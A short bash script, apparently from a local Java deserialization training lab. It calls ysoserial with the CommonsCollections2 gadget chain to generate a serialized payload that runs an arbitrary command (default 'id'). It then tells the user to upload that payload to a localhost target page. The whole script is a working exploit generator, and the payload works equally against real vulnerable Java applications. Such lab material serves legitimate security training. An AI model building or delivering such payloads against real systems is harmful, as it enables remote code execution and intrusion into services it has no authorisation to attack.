#!/bin/bash
# class15 — CC2链 (CommonsCollections2)
# 靶场: /class15/upload
cd "$(dirname "$0")"
CMD="${1:-id}"
JAVA_TOOL_OPTIONS="--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED
  --add-exports java.base/java.util=ALL-UNNAMED" \
java -jar ../../lib/ysoserial.jar CommonsCollections2 "$CMD" > ../../class15.ser 2>&1
echo "✅ 已生成: class15.ser (命令: $CMD)"
echo "🎯 上传到 http://localhost:81/class15/"
